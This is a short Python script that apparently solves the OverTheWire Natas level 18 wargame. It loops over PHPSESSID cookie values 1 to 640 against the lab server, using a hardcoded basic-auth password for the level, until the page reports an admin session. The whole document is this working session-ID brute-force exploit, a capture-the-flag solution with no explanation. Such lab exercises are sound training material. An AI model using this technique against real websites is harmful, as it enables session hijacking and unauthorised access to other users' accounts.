import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

for i in range(1, 641):
	print("checking id : ", i)
	cookies = dict(PHPSESSID=str(i))
	r = requests.post('http://natas18.natas.labs.overthewire.org/index.php', cookies=cookies, auth=auth)
	if "You are an admin" in r.text:
		print(cookies)
		break
